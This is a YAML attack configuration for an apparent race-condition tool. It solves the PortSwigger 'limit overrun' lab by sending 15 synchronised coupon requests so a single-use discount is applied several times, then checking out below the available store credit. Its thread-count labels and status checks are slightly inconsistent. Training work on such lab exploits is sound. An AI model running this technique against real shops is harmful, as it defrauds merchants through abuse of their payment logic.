# ============================================================================
# TRECO Configuration: PortSwigger Limit Overrun Race Conditions Lab
# ============================================================================
#
# Exploits a race condition in the coupon redemption system to apply a 
# single-use discount code multiple times, reducing the price below your 
# available store credit.
#
# Lab: https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
#
# Usage:
#   export LAB_HOST="YOUR-LAB-ID.web-security-academy.net"
#   uv run treco portswigger-limit-overrun.yaml
#
# ============================================================================

metadata:
  name: "PortSwigger - Limit Overrun Race Conditions"
  version: "1.0"
  author: "Hack N' Roll Security Team"
  vulnerability: "CWE-362"
  description: |
    Exploits race condition in POST /cart/coupon to apply 20% discount 
    multiple times, bypassing single-use validation.

target:
  host: "{{ env('LAB_HOST', '0a1b2c3d4e5f.web-security-academy.net') }}"
  port: 443
  tls:
    enabled: true
    verify_cert: false
  http:
    follow_redirects: false
  proxy:
    type: http
    host: 127.0.0.1
    port: 8080

entrypoint:
  state: initialize
  input:
    username: "wiener"
    password: "peter"
    coupon_code: "PROMO20"
    product_id: "1"

# ============================================================================
# STATES
# ============================================================================

states:

  # --------------------------------------------------------------------------
  # Initialization
  # --------------------------------------------------------------------------
  initialize:
    description: "Check if lab is running"
    request: |
      GET / HTTP/1.1
      Host: {{ target.host }}

    extract:
      session:
        type: cookie
        pattern: session

    logger:
      on_state_enter: |
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ¦ PortSwigger - Limit Overrun Race Condition                               â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘  ğŸ¯ Target:   {{ "%-62s" | format(target.host)                            }} â•‘
        â•‘  ğŸ‘¤ Username: {{ "%-62s" | format(username)                               }} â•‘
        â•‘  ğŸŸï¸ Coupon:   {{ "%-63s" | format(coupon_code)                            }} â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        ğŸ” Checking if lab is running...
      on_state_leave: |
        {% if response.status == 200 %}
        âœ… Lab is running!
        ğŸª Session: {{ initialize.session }}
        {% else %}
        âŒ Lab is not running!
        {% endif %}

    next:
      - on_status: 200
        goto: get_login_page
      - on_status: [404, 502, 503, 504]
        goto: end

  # --------------------------------------------------------------------------
  # Authentication Flow
  # --------------------------------------------------------------------------
  get_login_page:
    description: "Get CSRF token from login page"
    request: |
      GET /login HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ initialize.session }}

    extract:
      csrf:
        type: xpath
        pattern: '//input[@name="csrf"]/@value'

    logger:
      on_state_enter: |
        ğŸ” Retrieving login page...
      on_state_leave: |
        ğŸ”‘ CSRF: {{ get_login_page.csrf }}
        

    next:
      - on_status: 200
        goto: login

  login:
    description: "Authenticate with credentials"
    request: |
      POST /login HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/x-www-form-urlencoded
      Cookie: session={{ initialize.session }}
      
      username={{ username }}&password={{ password }}&csrf={{ get_login_page.csrf }}

    extract:
      session:
        type: cookie
        pattern: session

    logger:
      on_state_leave: |
        ğŸ” Logged in as '{{ username }}' (session: {{ login.session }})

    next:
      - on_status: 302
        goto: add_to_cart
      - on_status: 200
        goto: login_failed

  login_failed:
    description: "Authentication failed"
    logger:
      on_state_enter: |
        âŒ Login failed - check credentials and lab URL
    next:
      - goto: end

  # --------------------------------------------------------------------------
  # Cart Setup
  # --------------------------------------------------------------------------

  add_to_cart:
    description: "Add Leather Jacket to cart"
    request: |
      POST /cart HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/x-www-form-urlencoded
      Cookie: session={{ login.session }}
      
      productId={{ product_id }}&redir=PRODUCT&quantity=1

    logger:
      on_state_leave: |
        ğŸ›’ Added product #{{ product_id }} to cart

    next:
      - on_status: 302
        goto: view_cart_before

  view_cart_before:
    description: "Check cart before attack"
    request: |
      GET /cart HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ login.session }}

    extract:
      csrf:
        type: xpath
        pattern: '//form[@id="coupon-form"]//input[@name="csrf"]/@value'
      total:
        type: regex
        pattern: '<th>Total:</th>\s*<th>\$([0-9]+\.[0-9]{2})'
      credit:
        type: regex
        pattern: 'Store credit: \$([0-9]+\.[0-9]{2})'

    logger:
      on_state_leave: |
        ğŸ’° Total: ${{ view_cart_before.total }} | ğŸ’³ Credit: ${{ view_cart_before.credit }}

    next:
      - on_status: 200
        goto: race_apply_coupon

  # --------------------------------------------------------------------------
  # Race Attack
  # --------------------------------------------------------------------------

  race_apply_coupon:
    description: "Race condition - apply coupon multiple times"

    options:
      proxy_bypass: true

    request: |
      POST /cart/coupon HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/x-www-form-urlencoded
      Cookie: session={{ login.session }}
      
      csrf={{ view_cart_before.csrf }}&coupon={{ coupon_code }}

    race:
      threads: 15
      sync_mechanism: barrier
      connection_strategy: multiplexed
      thread_propagation: single

    logger:
      on_state_enter: |

        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚  âš¡ RACE ATTACK                                              â”‚
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  ğŸ”— Endpoint:  POST /cart/coupon                             â”‚
        â”‚  ğŸ§µ Threads:   20                                            â”‚
        â”‚  ğŸ”§ Strategy:  preconnect + barrier                          â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

      on_state_leave: âœ¨ Race complete

      on_thread_leave: |
        {% if 'Coupon applied' in response.text %}
        ğŸŸ¢ Coupon applied
        {% elif 'Coupon already applied' in response.text %}
        ğŸ”´ Already applied
        {% else %}
        ğŸŸ¡ {{ response.status_code }}
        {% endif %}
        
    next:
      - goto: view_cart_after

  # --------------------------------------------------------------------------
  # Results
  # --------------------------------------------------------------------------

  view_cart_after:
    description: "Check cart after attack"
    request: |
      GET /cart HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ login.session }}

    extract:
      total:
        type: regex
        pattern: '<th>Total:</th>\s*<th>\$([0-9]+\.[0-9]{2})'
      checkout_csrf:
        type: xpath
        pattern: '//form[@action="/cart/checkout"]//input[@name="csrf"]/@value'

    logger:
      on_state_leave: |

        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚  ğŸ“Š RESULTS                                                  â”‚
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  ğŸ’µ Before: ${{ "%-46s" | format(view_cart_before.total) }}  |
        â”‚  ğŸ’µ After:  ${{ "%-46s" | format(view_cart_after.total)  }}  |
        â”‚  ğŸ’³ Credit: ${{ "%-46s" | format(view_cart_before.credit)}}  |
        {% if view_cart_after.total | float <= view_cart_before.credit | float %}
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  ğŸ‰ VULNERABLE - Total is within store credit!               â”‚
        {% else %}
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  âš ï¸  Need more discounts - try increasing threads             â”‚
        {% endif %}
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

    next:
      - on_status: 200
        goto: checkout

  checkout:
    description: "Complete purchase"
    request: |
      POST /cart/checkout HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/x-www-form-urlencoded
      Cookie: session={{ login.session }}
      
      csrf={{ view_cart_after.checkout_csrf }}

    logger:
      on_state_leave: |
        {% if response.status in [302] %}

        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ† LAB SOLVED!                                              â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        {% elif 'Not enough store credit' in response.text %}
        ğŸ’¸ Insufficient credit - increase threads and retry
        {% else %}
        ğŸ” Response: {{ response.status }}
        {% endif %}

        {{ response.raw_response }}

    next:
      - on_status: 303
        goto: finish
      - goto: end

  finish:
    request: |
      GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ login.session }}
      

  end:
    description: "Complete"